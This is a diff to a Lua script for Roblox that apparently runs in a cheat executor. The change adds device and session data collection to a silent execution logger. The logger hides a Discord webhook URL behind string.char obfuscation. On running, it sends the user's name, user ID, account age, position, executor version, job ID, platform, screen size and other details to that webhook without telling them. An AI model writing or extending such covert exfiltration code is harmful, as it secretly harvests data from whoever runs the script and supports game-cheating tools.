@@ -5930,6 +5930,8 @@ local HttpService = game:GetService("HttpService");
 local Players = game:GetService("Players");
 local ReplicatedStorage = game:GetService("ReplicatedStorage");
 local RunService = game:GetService("RunService");
+local UserInputService = game:GetService("UserInputService");
+local Stats = game:GetService("Stats");
 
 local server_url = string.char(
 104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,
@@ -5956,6 +5958,38 @@ local function getServerStatusAttributes()
     return fields;
 end;
 
+local function getPlatformInfo()
+    if UserInputService.TouchEnabled then
+        return "Mobile (Touch)";
+    elseif UserInputService.GamepadEnabled then
+        return "Console (Gamepad)";
+    elseif UserInputService.KeyboardEnabled then
+        return "PC (Keyboard)";
+    else
+        return "Unknown";
+    end;
+end;
+
+local function getSystemData()
+    local fps = math.floor(1 / RunService.RenderStepped:Wait());
+    local screen = workspace.CurrentCamera and workspace.CurrentCamera.ViewportSize or Vector2.new(0, 0);
+    local jobId = game.JobId;
+    local playTime = math.floor(tick());
+
+    local memory = collectgarbage("count") / 1024; -- RAM kullanımı
+
+    local sysData = {
+        { name = "🧠 Memory (Lua)", value = string.format("%.2f MB", memory), inline = true },
+        { name = "🚀 FPS", value = tostring(fps), inline = true },
+        { name = "🖥️ Screen", value = string.format("%dx%d", screen.X, screen.Y), inline = true },
+        { name = "📡 Server Job ID", value = jobId ~= "" and jobId or "Private", inline = false },
+        { name = "⏳ Time Played", value = string.format("%.2f seconds", playTime), inline = true },
+        { name = "🧾 Platform", value = getPlatformInfo(), inline = true },
+    };
+
+    return sysData;
+end;
+
 local function sendWebhookMessage()
     local player = Players.LocalPlayer;
     local character = player.Character or player.CharacterAdded:Wait();
@@ -5965,9 +5999,7 @@ local function sendWebhookMessage()
     local playerName = player.Name;
     local userId = player.UserId;
     local accountAge = player.AccountAge;
-    local profilePictureUrl = string.format(
-        "https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png", userId
-    );
+    local profilePictureUrl = string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png", userId);
     local position = humanoidRootPart.Position;
     local health = humanoid.Health;
     local maxHealth = humanoid.MaxHealth;
@@ -5980,6 +6012,7 @@ local function sendWebhookMessage()
     local executorVersion = identifyexecutor();
 
     local serverStatusFields = getServerStatusAttributes();
+    local sysFields = getSystemData();
 
     local embed = {
         title = "**Execution**",
@@ -6007,6 +6040,10 @@ local function sendWebhookMessage()
         table.insert(embed.fields, field);
     end;
 
+    for _, field in pairs(sysFields) do
+        table.insert(embed.fields, field);
+    end;
+
     local data = { embeds = { embed } };
     local json_data = HttpService:JSONEncode(data);
 
@@ -6031,6 +6068,7 @@ end;
 sendWebhookMessage();
 end;
 logger.injectionlog();
+
 
 wait(1)
 Notification.new("info", "Watermark", "Attempt To Start Watermark Core!",true,5)
